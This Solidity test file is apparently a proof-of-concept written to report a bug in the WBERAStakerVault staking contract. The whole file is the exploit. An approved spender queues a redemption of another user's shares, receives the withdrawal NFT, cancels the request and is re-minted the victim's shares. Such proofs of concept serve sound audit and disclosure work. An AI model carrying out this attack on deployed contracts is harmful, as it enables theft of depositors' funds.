// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { Test } from "forge-std/Test.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import { WBERA } from "src/WBERA.sol";
import { Create2Deployer } from "src/base/Create2Deployer.sol";
import { WBERAStakerVault } from "src/pol/WBERAStakerVault.sol";
import { WBERAStakerVaultWithdrawalRequest } from "src/pol/WBERAStakerVaultWithdrawalRequest.sol";

/// An approved spender (`bob`) can convert an ERC4626 share allowance from `alice` into
/// fresh shares held by himself, without ever waiting out the 7-day cooldown.
///
/// Flow:
///   1. Alice deposits WBERA into the vault and receives sWBERA shares.
///   2. Alice approves Bob for `X` sWBERA (standard ERC4626 share allowance).
///   3. Bob calls `queueRedeem(X, receiver=anyone, owner=alice)`:
///       - Alice's `X` sWBERA are burned.
///       - The withdrawal-request NFT is minted to *Bob* (the caller), not to Alice.
///   4. Bob immediately calls `cancelQueuedWithdrawal(requestId)`:
///       - The vault re-mints fresh sWBERA shares to *msg.sender* (Bob).
///   5. Alice has lost all her shares; Bob now holds equivalent shares with no cooldown
///      and no further allowance from Alice required.
contract PoC_CancelQueuedWithdrawalSteal is Test, Create2Deployer {
    WBERAStakerVault internal vault;
    WBERA internal wbera;
    WBERAStakerVaultWithdrawalRequest internal withdrawals721;

    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal governance = makeAddr("governance");

    uint256 internal constant DEPOSIT_AMOUNT = 10 ether;

    function setUp() public {
        // Deploy WBERA mock at the canonical address used by the vault.
        wbera = WBERA(payable(0x6969696969696969696969696969696969696969));
        deployCodeTo("WBERA.sol", address(wbera));

        // Deploy implementations + proxies.
        WBERAStakerVault vaultImpl = new WBERAStakerVault();
        WBERAStakerVaultWithdrawalRequest reqImpl = new WBERAStakerVaultWithdrawalRequest();

        vault = WBERAStakerVault(payable(deployProxyWithCreate2(address(vaultImpl), 0)));
        withdrawals721 = WBERAStakerVaultWithdrawalRequest(
            payable(deployProxyWithCreate2(address(reqImpl), 0))
        );

        vault.initialize(governance);
        withdrawals721.initialize(governance, address(vault));
        vm.prank(governance);
        vault.setWithdrawalRequests721(address(withdrawals721));

        // Give Alice some WBERA to deposit.
        vm.deal(address(wbera), DEPOSIT_AMOUNT);
        vm.prank(address(wbera));
        wbera.deposit{ value: DEPOSIT_AMOUNT }();
        vm.prank(address(wbera));
        wbera.transfer(alice, DEPOSIT_AMOUNT);
    }

    function test_PoC_BobStealsAlicesSharesViaCancel() public {
        // --- 1. Alice deposits and obtains sWBERA shares. ---
        vm.startPrank(alice);
        wbera.approve(address(vault), DEPOSIT_AMOUNT);
        uint256 aliceSharesBefore = vault.deposit(DEPOSIT_AMOUNT, alice);
        vm.stopPrank();

        assertEq(vault.balanceOf(alice), aliceSharesBefore, "alice should hold her freshly minted shares");
        assertEq(vault.balanceOf(bob), 0, "bob starts with no shares");
        assertEq(wbera.balanceOf(alice), 0, "alice deposited all of her WBERA");

        // --- 2. Alice grants Bob an ERC4626 share allowance. ---
        // This is the normal ERC4626 pattern: Alice trusts Bob to *redeem on her behalf*
        // (assets go to the receiver she names), but not to keep the shares themselves.
        vm.prank(alice);
        vault.approve(bob, aliceSharesBefore);

        assertEq(vault.allowance(alice, bob), aliceSharesBefore);

        // --- 3. Bob queues a redemption on Alice's behalf. ---
        // Bob passes `owner = alice` and any `receiver` he likes — call it `charlie`.
        // The receiver is irrelevant to the exploit because the assets are never
        // actually delivered; the cancel path short-circuits the flow.
        address charlie = makeAddr("charlie");
        vm.prank(bob);
        (uint256 assetsQueued, uint256 requestId) =
            vault.queueRedeem(aliceSharesBefore, charlie, alice);

        // Allowance was spent in full.
        assertEq(vault.allowance(alice, bob), 0, "allowance consumed");
        // Alice's shares have been burned.
        assertEq(vault.balanceOf(alice), 0, "alice's shares were burned during queueRedeem");
        // The withdrawal NFT was minted to Bob (the *caller*), not to Alice or the receiver.
        assertEq(
            IERC721(address(withdrawals721)).ownerOf(requestId),
            bob,
            "BUG: NFT is minted to caller, not to owner"
        );
        // Charlie (the named receiver) has no WBERA yet — assets are still reserved.
        assertEq(wbera.balanceOf(charlie), 0);

        // --- 4. Bob immediately cancels the request. ---
        // `cancelQueuedWithdrawal` re-mints fresh sWBERA shares to `msg.sender` (Bob).
        // No cooldown, no further check that Bob ever owned these shares.
        vm.prank(bob);
        vault.cancelQueuedWithdrawal(requestId);

        // --- 5. Outcome: Bob now holds shares equivalent to Alice's original position. ---
        uint256 bobSharesAfter = vault.balanceOf(bob);
        assertGt(bobSharesAfter, 0, "bob now holds shares minted to him by the vault");
        // Within rounding tolerance, Bob got essentially the full position back.
        assertApproxEqAbs(
            bobSharesAfter,
            aliceSharesBefore,
            1,
            "bob received ~the same amount of shares that were burned from alice"
        );
        assertEq(vault.balanceOf(alice), 0, "alice ends with nothing");

        // Bob can now freely redeem these shares for himself (after cooldown), or transfer them.
        // The cooldown was effectively bypassed: a single allowance approval was converted
        // into outright ownership of shares.
        emit log_named_uint("assets that were 'queued' for the fake withdrawal", assetsQueued);
        emit log_named_uint("shares minted to Bob via cancel",                    bobSharesAfter);
        emit log_named_uint("alice final share balance",                          vault.balanceOf(alice));
    }
}
